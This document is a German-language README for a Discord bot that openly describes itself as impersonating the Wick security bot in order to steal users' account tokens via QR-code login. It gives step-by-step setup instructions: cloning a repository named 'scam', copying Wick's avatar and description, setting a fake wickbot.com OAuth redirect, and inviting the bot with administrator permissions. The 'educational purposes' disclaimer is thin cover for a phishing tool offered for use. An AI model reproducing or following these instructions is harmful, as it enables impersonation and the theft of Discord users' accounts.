<h1 align="center">Discord-QR-Code-Token-Logger</h1>
<h3 align="center">Discord Bot, der sich als Wick Bot ausgibt, um Token zu stehlen!</h3>

## Merkmale
- **Sieht genauso aus wie Wick Bot.** (bei richtiger Konfiguration)
- **Speichereffizient.** (verwendet weder chromedriver.exe noch irgendeinen Browser)
- **Sehr stabil und zuverlässig.** (minimale Abstürze und Bugs)

## Haftungsausschluss
- Dies ist ein Bot, der keinem der Teams von Discord oder Discord Inc. angehört.
- Dies wurde zu Bildungszwecken gemacht. Es ist nicht dazu gedacht, für böswillige Zwecke verwendet zu werden.
- Jegliche Nutzung dieses Bots erfolgt auf eigene Gefahr. Ich übernehme keine Haftung für eventuell auftretende Schäden.

## Konfiguration
- **Repository klonen und Abhängigkeiten installieren**
    - ```gh repo clone ulnk/scam```
    - ```npm install``` oder ```yarn```
- **Neuen Discord-Bot erstellen**
    - Aktivieren Sie alle Absichten für den Bot
    - Fügen Sie ```https://wickbot.com/wauth/callback``` zu den Umleitungs-URLs im OAuth2-Abschnitt der Bot-Einstellungen hinzu.
    - Ändern Sie das Profilbild des Bots in [wick.png](https://github.com/ulnk/scam/blob/main/wick.png).
    - Ändere die Beschreibung des Bots in
        - ```Discord Security Bot zum Schutz von Servern vor Überfällen, Atomwaffen und mehr! https://wickbot.com/ ```
    - Verwenden Sie diese URL, um den Bot einzuladen (ändern Sie client_id in die Client-ID Ihres Bots):
        - ```https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=8&redirect_uri=https%3A%2F%2Fwickbot.com%2Fwauth%2Fcallback&response_type=code&scope=applications.commands%20bot%20messages.read` „
- **config-default.json bearbeiten**
    - Benennen Sie es in „config.json“ um
- **Emojis zu einem Discord-Server hinzufügen**
    - Es wird empfohlen, Emojis auf einem separaten Server zu platzieren.
    - Sie können alle auswählen und in den Emojis-Bereich in den Servereinstellungen ziehen, um schnell alle hinzuzufügen.
    - Der Bot findet die Emojis automatisch, ohne dass alle IDs abgerufen werden müssen. (Name der Emojis nicht ändern)
- **Bot starten**
    - ```npm run start``` oder ```yarn start```

### Verwendete Bibliotheken
* **discord.js** (Discord-Bot) <img alt="preview badge" src="https://img.shields.io/npm/v/discord.js">
* **Krypto** (private Schlüssel & öffentliche Schlüssel) <img alt="preview badge" src="https://img.shields.io/npm/v/crypto">
* **ws** (Web-Socket) <img alt="Vorschauabzeichen" src="https://img.shields.io/npm/v/ws">
* **jimp** (Bildbearbeitung für QR-Code) <img alt="preview badge" src="https://img.shields.io/npm/v/jimp">
